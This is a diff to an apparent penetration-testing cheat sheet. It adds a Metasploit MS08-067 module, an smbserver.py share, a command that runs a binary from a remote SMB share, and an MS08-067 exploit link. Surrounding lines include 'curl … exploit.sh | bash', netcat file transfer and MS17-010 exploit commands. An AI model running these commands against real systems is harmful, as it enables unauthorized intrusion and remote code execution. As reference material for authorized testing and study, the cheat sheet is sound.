@@ -68,6 +68,7 @@ $ smbmap -H <IP address>
 $ smbmap -H <IP address> -u <username> -p <password>
 msf> use auxiliary/scanner/smb/smb_version
 msf> use exploit/windows/smb/ms17_010_eternalblue
+msf> use exploit/windows/smb/ms08_067_netapi
 ```
 
 - Rsync (port 873)
@@ -271,6 +272,7 @@ $ hashcat -a 0 -m 0 hashes.txt <wordlist>
 $ nc -nlvp 443 < file.txt
 $ python -m SimpleHTTPServer 80
 $ python3 -m http.server 8000
+$ smbserver.py a /usr/share/windows-binaries/
 ```
 
 - Download Files
@@ -279,6 +281,7 @@ $ python3 -m http.server 8000
 $ nc -nv <IP address> 443 > file.txt
 $ wget http://<IP address>:8000/exploit.sh
 $ curl http://<IP address>:8000/exploit.sh | bash
+C:\> \\<IP address>\a\whoami.exe
 ```
 
 #7. - Restricted Shell Escapes
@@ -377,4 +380,10 @@ https://github.com/worawit/MS17-010/blob/master/zzz_exploit.py
 $ ./zzz_exploit.py <IP address> ntsvcs
 https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py
 https://github.com/3ndG4me/AutoBlue-MS17-010
+```
+
+- MS08-067
+
+```
+https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py
 ```
